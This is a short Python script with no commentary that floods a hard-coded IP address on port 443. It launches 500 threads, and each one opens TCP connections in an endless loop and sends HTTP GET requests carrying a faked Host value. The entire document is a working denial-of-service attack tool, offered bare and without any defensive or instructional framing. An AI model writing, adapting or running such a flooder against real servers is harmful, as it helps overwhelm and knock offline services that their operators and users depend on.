import threading
import socket

target = '93.184.216.34'
port = 443
fake_ip = '171.21.20.23'

alrady_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global alrady_connected
        alrady_connected += 1
        print(alrady_connected)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
